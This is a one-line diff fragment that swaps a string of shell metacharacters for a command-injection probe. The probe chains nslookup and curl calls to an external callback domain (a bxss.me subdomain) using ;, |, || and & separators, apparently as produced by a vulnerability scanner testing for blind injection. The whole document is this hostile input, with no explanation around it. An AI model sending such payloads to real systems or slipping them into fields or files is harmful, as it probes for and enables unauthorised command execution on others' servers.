@@ -1,1 +1,1 @@
-!(()&&!|*|*|
+;(nslookup -q=cname hitliwdvftsgl70f40.bxss.me||curl hitliwdvftsgl70f40.bxss.me)|(nslookup -q=cname hitliwdvftsgl70f40.bxss.me||curl hitliwdvftsgl70f40.bxss.me)&(nslookup -q=cname hitliwdvftsgl70f40.bxss.me||curl hitliwdvftsgl70f40.bxss.me)
